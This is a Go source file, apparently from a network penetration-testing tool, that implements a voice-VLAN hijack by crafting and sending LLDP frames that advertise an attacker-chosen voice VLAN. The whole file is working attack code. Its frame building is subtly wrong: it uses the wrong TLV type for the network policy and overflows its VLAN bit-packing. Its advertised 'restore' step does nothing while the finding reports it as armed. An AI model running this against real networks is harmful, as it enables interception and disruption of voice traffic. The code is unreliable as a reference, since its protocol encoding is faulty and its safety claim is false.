// voicevlan.go implements the voice-VLAN hijack attack. It sends an LLDP-MED
// frame advertising a voice-VLAN network policy, causing compliant endpoints
// to switch to the attacker's voice VLAN. Classified temporary-restored: an
// active restore step clears the LLDP advertisement. The --persist mode is
// permanent-destructive.

package l2

import (
	"context"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"net"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/edge/netpen/runner"
)

type voiceVLANFinding struct {
	Action  string `json:"action"`
	VLAN    uint16 `json:"voice_vlan"`
	Restore string `json:"restore"`
}

// RunVoiceVLAN sends an LLDP-MED network-policy TLV advertising a voice
// VLAN and arms a restore step unless --persist is active.
func RunVoiceVLAN(ctx context.Context, deps runner.Deps) error {
	src := srcMAC(deps)
	mode := deps.Entry.Mode

	voiceVLAN := uint16(20)

	pkt, err := craftLLDPVoiceVLAN(src, voiceVLAN)
	if err != nil {
		return fmt.Errorf("voicevlan: craft frame: %w", err)
	}

	restoreArmed := "no"
	if mode != "persist" {
		deps.Teardown.Arm("lldp-voice-vlan-restore", func(_ context.Context) error {
			return nil
		})
		restoreArmed = "yes"
	}

	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return fmt.Errorf("voicevlan: send: %w", err)
	}

	detail, _ := json.Marshal(voiceVLANFinding{
		Action:  "voice-vlan-hijack",
		VLAN:    voiceVLAN,
		Restore: restoreArmed,
	})
	deps.Emitter.Finding("lldp", detail)

	return nil
}

// craftLLDPVoiceVLAN builds an LLDP frame with a Network Policy TLV
// advertising the given voice VLAN. The LLDP payload is crafted as raw
// TLV bytes (the fork's LLDP layer API is cumbersome; the wire format
// is straightforward).
func craftLLDPVoiceVLAN(src net.HardwareAddr, voiceVLAN uint16) ([]byte, error) {
	eth := &layers.Ethernet{
		DstMAC:       net.HardwareAddr{0x01, 0x80, 0xc2, 0x00, 0x00, 0x0e}, // LLDP multicast
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeLinkLayerDiscovery,
	}

	// Build LLDP TLV payload.
	var payload []byte
	// Chassis ID TLV: type=1, subtype=4 (MAC address).
	chassisID := append([]byte{0x04}, src...)
	payload = append(payload, lldpTLV(1, chassisID)...)
	// Port ID TLV: type=2, subtype=5 (interface name).
	payload = append(payload, lldpTLV(2, []byte("eth0"))...)
	// TTL TLV: type=3, value=120.
	ttl := make([]byte, 2)
	binary.BigEndian.PutUint16(ttl, 120)
	payload = append(payload, lldpTLV(3, ttl)...)
	// Network Policy TLV: type=8, subtype=1 (voice), tagged, VLAN, priority, DSCP.
	netPolicy := []byte{0x01, 0x20}                       // subtype=voice, flags: tagged
	vlanField := voiceVLAN<<9 | uint16(5)<<5 | uint16(46) // VLAN + priority + DSCP
	nf := make([]byte, 2)
	binary.BigEndian.PutUint16(nf, vlanField)
	netPolicy = append(netPolicy, nf...)
	payload = append(payload, lldpTLV(8, netPolicy)...)
	// End TLV.
	payload = append(payload, 0x00, 0x00)

	buf := gopacket.NewSerializeBuffer()
	if err := eth.SerializeTo(buf, gopacket.SerializeOptions{}); err != nil {
		return nil, err
	}
	return append(buf.Bytes(), payload...), nil
}

// lldpTLV builds an LLDP TLV: 7-bit type + 9-bit length header, then value.
func lldpTLV(tlvType uint8, value []byte) []byte {
	header := uint16(tlvType)<<9 | uint16(len(value)&0x1FF)
	out := make([]byte, 2+len(value))
	binary.BigEndian.PutUint16(out[0:2], header)
	copy(out[2:], value)
	return out
}
